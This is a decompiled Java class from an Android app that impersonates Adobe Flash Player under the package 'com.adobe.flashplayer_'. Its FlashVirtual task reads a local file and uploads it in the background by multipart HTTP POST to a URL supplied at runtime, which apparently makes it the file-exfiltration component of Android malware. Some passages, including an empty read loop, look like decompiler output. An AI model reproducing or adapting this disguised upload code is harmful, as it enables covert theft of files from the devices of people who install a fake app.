package com.adobe.flashplayer_;

import android.os.AsyncTask;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class FlashVirtual extends AsyncTask<String, String, String> {
    /* access modifiers changed from: protected|varargs */
    public String doInBackground(String... params) {
        DataInputStream dataInputStream;
        HttpURLConnection conn = null;
        String exsistingFileName = params[1];
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        String urlString = params[2] + "?a=3" + params[0];
        try {
            FileInputStream fileInputStream = new FileInputStream(new File(exsistingFileName));
            conn = (HttpURLConnection) new URL(urlString).openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
            DataOutputStream dataOutputStream;
            try {
                dos.writeBytes(new StringBuilder(String.valueOf(twoHyphens)).append(boundary).append(lineEnd).toString());
                dos.writeBytes("Content-Disposition: form-data; name='TEMP'; filename='" + exsistingFileName + "'" + lineEnd);
                dos.writeBytes(lineEnd);
                int bufferSize = Math.min(fileInputStream.available(), AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                byte[] buffer = new byte[bufferSize];
                int bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                while (bytesRead > 0) {
                    dos.write(buffer, 0, bufferSize);
                    bufferSize = Math.min(fileInputStream.available(), AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }
                dos.writeBytes(lineEnd);
                dos.writeBytes(new StringBuilder(String.valueOf(twoHyphens)).append(boundary).append(twoHyphens).append(lineEnd).toString());
                fileInputStream.close();
                dos.flush();
                dos.close();
                dataOutputStream = dos;
            } catch (MalformedURLException e) {
                dataOutputStream = dos;
            } catch (IOException e2) {
                dataOutputStream = dos;
            }
        } catch (IOException | MalformedURLException e3) {
        }
        try {
            DataInputStream inStream = new DataInputStream(conn.getInputStream());
            do {
                try {
                } catch (IOException e4) {
                    dataInputStream = inStream;
                }
            } while (inStream.readLine() != null);
            inStream.close();
            dataInputStream = inStream;
        } catch (IOException e5) {
        }
        return null;
    }
}
